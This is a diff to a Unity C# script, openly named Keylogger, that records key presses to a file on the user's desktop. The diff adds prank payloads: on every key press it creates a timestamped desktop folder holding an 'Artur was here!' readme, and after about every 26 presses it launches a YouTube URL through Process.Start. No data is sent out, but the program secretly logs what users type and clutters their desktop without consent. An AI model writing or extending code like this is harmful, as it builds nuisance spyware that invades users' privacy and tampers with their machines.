@@ -1,10 +1,13 @@
 using UnityEngine;
 using System;
 using System.IO;
+using System.Diagnostics;
 
 public class Keylogger : MonoBehaviour
 {
     private StreamWriter sw;
+    public int counter = 0;
+    string url = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
 
     void Start()
     {
@@ -17,7 +20,22 @@ public class Keylogger : MonoBehaviour
         {
             if (Input.GetKeyDown(keyCode))
             {
+
+
+              string formattedDateTime = GetCurrentDateTimeWithUnderscore();
+              CreateFolderOnDesktop(formattedDateTime+"_"+counter);
+
                 LogKeyPress(keyCode);
+
+                if(counter > 25){
+
+                  OpenURL(url);
+                  counter =  0;
+                }
+
+                counter++;
+
+
             }
         }
 
@@ -28,6 +46,36 @@ public class Keylogger : MonoBehaviour
         string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
         string logFilePath = Path.Combine(desktopPath, "KeyLog.txt");
         sw = new StreamWriter(logFilePath, true);
+    }
+
+
+    private void CreateFolderOnDesktop(string folderName)
+    {
+        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+        string folderPath = Path.Combine(desktopPath, folderName);
+
+        // Check if the folder already exists
+        if (!Directory.Exists(folderPath))
+        {
+            Directory.CreateDirectory(folderPath);
+            // Navigate into the newly created folder
+            Directory.SetCurrentDirectory(folderPath);
+
+            string readmeFilePath = Path.Combine(folderPath, "readme.md");
+            using (StreamWriter writer = new StreamWriter(readmeFilePath))
+            {
+                writer.WriteLine("Artur was here!");
+            }
+        }
+
+      }
+
+
+      private string GetCurrentDateTimeWithUnderscore()
+    {
+        DateTime currentDateTime = DateTime.Now;
+        string formattedDateTime = currentDateTime.ToString("yyyy_MM_dd_HH_mm_ss");
+        return formattedDateTime;
     }
 
     private void LogKeyPress(KeyCode keyCode)
@@ -54,6 +102,19 @@ public class Keylogger : MonoBehaviour
         }
         sw.WriteLine();
         sw.Flush();
+    }
+
+
+    void OpenURL(string url)
+    {
+        // Check if we're in the Unity editor or in a standalone build
+        #if UNITY_EDITOR
+            // Open in browser for Unity editor
+            Process.Start(url);
+        #elif UNITY_STANDALONE
+            // Open in browser for standalone build
+            Process.Start(url);
+        #endif
     }
 
     private void OnDestroy()
